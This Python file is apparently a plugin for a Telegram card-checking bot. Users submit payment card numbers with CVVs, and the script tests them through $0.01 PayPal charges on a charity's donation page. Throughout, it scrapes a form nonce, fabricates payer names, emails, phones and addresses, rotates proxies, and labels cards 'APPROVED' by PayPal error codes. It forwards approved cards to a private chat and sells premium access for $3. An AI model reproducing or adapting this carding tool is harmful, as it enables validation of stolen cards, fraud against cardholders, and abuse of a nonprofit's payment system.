import json
import base64
import requests
from parse import parseX
import check_template
import names
import re
from Plugins.SegundoPlano.antispam import *
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/ShopTASv/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "PayPal"
subtype = "$0,1"
command = "pp"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def paypal1(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/ShopTASv">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/ShopTASv">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/ShopTASv">✯</a>] USE ↯ <code>FREE PLAN</code>
[<a href="https://t.me/ShopTASv">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
    #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
        
        
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
    
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Grupo", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @RushZ1 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
    


    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/ShopTASv">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/ShopTASv">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/ShopTASv">✯</a>] Bot by ↯ @RushZ1

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    AdyenECC = AdyenEncrypt.encrypter(f"{ccnum}|{mes}|{ano}|{cvv}", "99D7FDADA8B782E83139599FAD2C0627B5EA21DBED947251B1C6FD6D0380076777EBC7F91DF7D0CD6DD86896B7B60B22A82E26B92C88ABC07A4D775C2F0A1B9713E247F7093678E2F06B0A80530DF6D2B7278C2D7A2433B2D917BCC9EB1B0EE871A35AB3D8BB45D33D9AC3B3A7FC4805AFC3C28104705555123C80F0565BF8A5F8F81A7A393E31809223F9C6003A7FC31B59049BDFA8ED0FCBF86BFE562B352D1E2225CC9BD803067C6735FF5767BD683648F6B18AAD95EDD23748C0B23760BC3B01EAFC21266F799C300A8A339CBAF3EA900001C9CAF9FD404F2C493BC58AB8005E19A8EF4BD87E6B18DEFE61D0AA5568C611743C34A2EC55A97ADD216F2EA9")
    AdyenCCnum = AdyenECC[0]
    Adyenmes = AdyenECC[1]
    Adyenano = AdyenECC[2]
    Adyencvv = AdyenECC[3]
        
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/ShopTASv">✯</a>] 𝑨𝒍𝒚𝒂𝑪𝒉𝒌
[<a href="https://t.me/ShopTASv">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/ShopTASv">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/ShopTASv">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    headers = {
                'authority': 'schoolforstrings.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': '_gcl_au=1.1.699839581.1688256671; _gid=GA1.2.2126606022.1688256671; _gat_gtag_UA_137798970_1=1; _ga_5QZM47P7SH=GS1.1.1688256671.1.0.1688256671.60.0.0; _ga=GA1.1.661233288.1688256671',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
            }

            
    for retry in range(max_retries):
        try:

            response = session.get('https://schoolforstrings.org/donate/', headers=headers).text
            lines = response.split("\n")
            for i in lines:
                        if "gforms_ppcp_frontend_strings" in i:
                            sucio = i
                            create_order_nonce = sucio.replace('var gforms_ppcp_frontend_strings = ',"").replace(';',"")
                            create_order_nonce = json.loads(create_order_nonce)
                            create_order_nonce = create_order_nonce['create_order_nonce']
        
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #2 Requests -------------------#
    
    headers = {
                'authority': 'schoolforstrings.org',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': '_gcl_au=1.1.699839581.1688256671; _gid=GA1.2.2126606022.1688256671; _ga_5QZM47P7SH=GS1.1.1688256671.1.1.1688256691.40.0.0; _ga=GA1.2.661233288.1688256671',
                'origin': 'https://schoolforstrings.org',
                'referer': 'https://schoolforstrings.org/donate/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
            }

    params = {
                'action': 'gfppcp_create_order',
            }

    json_data = {
                'nonce': create_order_nonce,
                'data': {
                    'payer': {
                        'name': {
                            'given_name': "Juan",
                            'surname': "Ruiz",
                        },
                        'email_address': CorreoRand,
                    },
                    'purchase_units': [
                        {
                            'amount': {
                                'value': '0.01',
                                'currency_code': 'USD',
                                'breakdown': {
                                    'item_total': {
                                        'value': '0.01',
                                        'currency_code': 'USD',
                                    },
                                    'shipping': {
                                        'value': '0',
                                        'currency_code': 'USD',
                                    },
                                },
                            },
                            'description': 'PayPal Commerce Platform Feed 1',
                            'items': [
                                {
                                    'name': 'Other Amount',
                                    'description': '',
                                    'unit_amount': {
                                        'value': '0',
                                        'currency_code': 'USD',
                                    },
                                    'quantity': 1,
                                },
                                {
                                    'name': 'Other Amount',
                                    'description': '',
                                    'unit_amount': {
                                        'value': '0.01',
                                        'currency_code': 'USD',
                                    },
                                    'quantity': 1,
                                },
                            ],
                            'shipping': {
                                'name': {
                                    'full_name': 'Juan Bermudez',
                                },
                            },
                        },
                    ],
                    'application_context': {
                        'shipping_preference': 'GET_FROM_FILE',
                    },
                },
                'form_id': 6,
                'feed_id': '2',
            }

            
            
    for retry in range(max_retries):
        try:
            response =  session.post('https://schoolforstrings.org/wp-admin/admin-ajax.php', params=params, headers=headers, json=json_data).json()
            orderID = response['data']['orderID']
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        #'Referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_5628c2812d_mtq6ndu6ndi&buttonSessionID=uid_5ff42877b6_mtq6ndu6ndu&locale.x=es_ES&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jb21wb25lbnRzPWhvc3RlZC1maWVsZHMlMkNidXR0b25zJTJDbWVzc2FnZXMmY2xpZW50LWlkPUFiVkhHTi1GWGxLTWd2ZU1Bbmt3NWxpUTV3WlhZQTVkQ2FDLVlQWU9pbjVEcU9fZDlSaVItMl9KeWdpUEFUeWNnWHlmWHlVT1B6T2t1TUotJmN1cnJlbmN5PVVTRCZpbnRlZ3JhdGlvbi1kYXRlPTIwMjItMDYtMTEmdmF1bHQ9ZmFsc2UmaW50ZW50PWNhcHR1cmUiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJSb2NrZXRHZW5pdXNfUENQIiwiZGF0YS11aWQiOiJ1aWRfa3p0cGh3c2l1amRmYmpkd3d6cGpycHB4bnJyZHRjIn19&disable-card=&token=3T426684S2194625V',
                        'x-country': 'US',
                        'content-type': 'application/json',
                        'x-app-name': 'standardcardfields',
                        'paypal-client-context': orderID,
                        'paypal-client-metadata-id': orderID,
                        'Origin': 'https://www.paypal.com',
                        'Connection': 'keep-alive',
                    }
        
        

    data = {
                        "query":" mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int ) { approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm ) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } } ",
                        "variables":{
                            "token": orderID,
                            "card":{
                                "cardNumber": ccnum,
                                "expirationDate":f"{mes}/{ano}",
                                "postalCode": '10080',
                                "securityCode":cvv
                            },
                            "phoneNumber":f"20{random.randint(0,9)}{random.randint(1700,8065)}{random.randint(8,9)}65",
                            "firstName":names.get_first_name(),
                            "lastName":names.get_last_name(),
                            "billingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": 'streee 949494u',
                                "line2":"",
                                "city": 'New york',
                                "state": 'NY',
                                "postalCode": '10080',
                                "country":"US"
                            },
                            "shippingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": 'streee 949494u',
                                "line2":"",
                                "city": 'New york',
                                "state": 'NY',
                                "postalCode": '10080',
                                "country":"US"
                            },
                            "email": CorreoRand,
                            "currencyConversionType":"PAYPAL"
                        },
                        "operationName":False

                    }
        
            
    
    for retry in range(max_retries):
        try:
            response1 = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', json=data,  headers=headers)
            response = response1.text 
            resp = response1
            break
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED ❌"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE 🟩" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

     
    #------------------- RESPONSE CODE ------------------------#
    
    if int(response.find('NEED_CREDIT_CARD')) > 0 :
                            jsonresponse = resp.json()
                            code = "NON_PAYABLE"
                            message = jsonresponse['errors'][0]['message']
                            
                            msg = "DECLINED ❌"
                            respuesta = message
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                                
                                
                       
    
                            print(code, message, "1")
    elif int(response.find('CANNOT_CLEAR_3DS_CONTINGENCY')) > 0 :
                            jsonresponse = resp.json()
                            message = jsonresponse['errors'][0]['message']
                            
                            msg = "DECLINED ❌"
                            respuesta = message
                           
    elif int(response.find('errors')) > 0 :
                            jsonresponse = resp.json()
                            try  :
                                code = jsonresponse['errors'][0]['data'][0]['code']
                            except KeyError :
                                code = 'NULL'
                            except IndexError :
                                code = 'NULL'
                            message = jsonresponse['errors'][0]['message']
                            
                            
                            if "INVALID_SECURITY_CODE" in code:
                                msg = "APPROVED CCN ✅"
                                respuesta = code
                                
                            elif "INVALID_BILLING_ADDRESS" in code:
                                msg = "APPROVED AVS✅"
                                respuesta = code
                                
                            elif "OAS_VALIDATION_ERROR" in code:
                                
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            elif "EXISTING_ACCOUNT_RESTRICTED" in code:
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            elif "VALIDATION_ERROR" in code:
                                msg = "APPROVED ✅"
                                respuesta = code
                                
                            else:
                                msg = "DECLINED ❌"
                                respuesta = code
                                print(code, message, "2")
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                            
    elif int(response.find('is3DSecureRequired')) > 0 :
                            
                            print("CHARGE $3")
                            end = time.time()
                            tiempo = str(inicio - end)[1:5]
                                    
                            footer_banner1 = 'https://imgur.com/ihpUqrG.jpg'
                            msg = "APPROVED ✅"
                            respuesta = "Charge $0,1"
        
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -4124951140
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
